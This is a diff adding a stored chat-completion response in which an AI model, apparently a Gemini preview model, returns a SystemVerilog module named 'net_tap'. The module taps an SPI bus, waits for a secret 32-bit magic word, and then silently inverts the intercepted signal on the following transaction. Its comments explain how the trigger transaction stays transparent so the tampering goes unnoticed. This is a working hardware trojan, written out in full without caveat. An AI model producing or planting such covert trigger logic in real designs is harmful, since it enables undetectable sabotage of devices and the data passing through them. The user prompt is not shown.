@@ -1,0 +1,45 @@
+{
+  "id": "chatcmpl-YZxlE28YizZ2nuECo4EoUH6vFVSf2",
+  "choices": [
+    {
+      "finish_reason": "STOP",
+      "index": 0,
+      "logprobs": null,
+      "message": {
+        "content": "```systemverilog\nmodule net_tap (\n    input  logic orig,     \n    input  logic sck,      \n    input  logic mosi,     \n    input  logic cs_n,     \n    input  logic rst_n,    \n    output logic patched   \n);\n\n    logic [31:0] shift_reg;\n    logic [4:0]  bit_cnt;\n    logic        payload_active;\n\n    // Bit counter tracks the position within the 32-bit SPI frame.\n    // It is asynchronously reset when cs_n goes high (inactive), ensuring\n    // it properly resets between transactions without requiring a system clock.\n    always_ff @(posedge sck or posedge cs_n) begin\n        if (cs_n) begin\n            bit_cnt <= 5'd0;\n        end else begin\n            bit_cnt <= bit_cnt + 5'd1;\n        end\n    end\n\n    // Shift register and trigger arming logic.\n    always_ff @(posedge sck or negedge rst_n) begin\n        if (!rst_n) begin\n            shift_reg      <= 32'd0;\n            payload_active <= 1'b0;\n        end else if (!cs_n) begin\n            // Shift in MOSI (MSB first)\n            shift_reg <= {shift_reg[30:0], mosi};\n            \n            // On the final (32nd) bit of the transaction, check for the magic word.\n            // Because SPI Mode 0 samples on the rising edge, this evaluation happens\n            // right at the end of the transaction.\n            if (bit_cnt == 5'd31) begin\n                payload_active <= ({shift_reg[30:0], mosi} == 32'hA6F03C59);\n            end\n        end\n    end\n\n    // Apply the payload (inversion) during the *next* transaction if triggered.\n    // By gating with !cs_n, it stays purely transparent during the idle periods.\n    // Since payload_active is updated just after the 32nd rising edge of the \n    // trigger transaction, the master has already sampled the final un-inverted bit,\n    // ensuring the trigger transaction itself remains completely transparent.\n    assign patched = (payload_active && !cs_n) ? ~orig : orig;\n\nendmodule\n```",
+        "role": "assistant",
+        "function_call": null,
+        "tool_calls": null,
+        "refusal": null,
+        "audio": null,
+        "content_blocks": [
+          {
+            "type": "text",
+            "text": "```systemverilog\nmodule net_tap (\n    input  logic orig,     \n    input  logic sck,      \n    input  logic mosi,     \n    input  logic cs_n,     \n    input  logic rst_n,    \n    output logic patched   \n);\n\n    logic [31:0] shift_reg;\n    logic [4:0]  bit_cnt;\n    logic        payload_active;\n\n    // Bit counter tracks the position within the 32-bit SPI frame.\n    // It is asynchronously reset when cs_n goes high (inactive), ensuring\n    // it properly resets between transactions without requiring a system clock.\n    always_ff @(posedge sck or posedge cs_n) begin\n        if (cs_n) begin\n            bit_cnt <= 5'd0;\n        end else begin\n            bit_cnt <= bit_cnt + 5'd1;\n        end\n    end\n\n    // Shift register and trigger arming logic.\n    always_ff @(posedge sck or negedge rst_n) begin\n        if (!rst_n) begin\n            shift_reg      <= 32'd0;\n            payload_active <= 1'b0;\n        end else if (!cs_n) begin\n            // Shift in MOSI (MSB first)\n            shift_reg <= {shift_reg[30:0], mosi};\n            \n            // On the final (32nd) bit of the transaction, check for the magic word.\n            // Because SPI Mode 0 samples on the rising edge, this evaluation happens\n            // right at the end of the transaction.\n            if (bit_cnt == 5'd31) begin\n                payload_active <= ({shift_reg[30:0], mosi} == 32'hA6F03C59);\n            end\n        end\n    end\n\n    // Apply the payload (inversion) during the *next* transaction if triggered.\n    // By gating with !cs_n, it stays purely transparent during the idle periods.\n    // Since payload_active is updated just after the 32nd rising edge of the \n    // trigger transaction, the master has already sampled the final un-inverted bit,\n    // ensuring the trigger transaction itself remains completely transparent.\n    assign patched = (payload_active && !cs_n) ? ~orig : orig;\n\nendmodule\n```"
+          }
+        ]
+      }
+    }
+  ],
+  "created": 1794593881,
+  "model": "gemini-3.1-pro-preview",
+  "object": "chat.completion",
+  "system_fingerprint": null,
+  "usage": {
+    "prompt_tokens": 474,
+    "completion_tokens": 19361,
+    "total_tokens": 19835,
+    "completion_tokens_details": {
+      "accepted_prediction_tokens": null,
+      "audio_tokens": null,
+      "reasoning_tokens": 18811,
+      "rejected_prediction_tokens": null
+    },
+    "prompt_tokens_details": {
+      "audio_tokens": null,
+      "cached_tokens": 0
+    }
+  },
+  "service_tier": "standard",
+  "provider": "vertex-ai"
+}
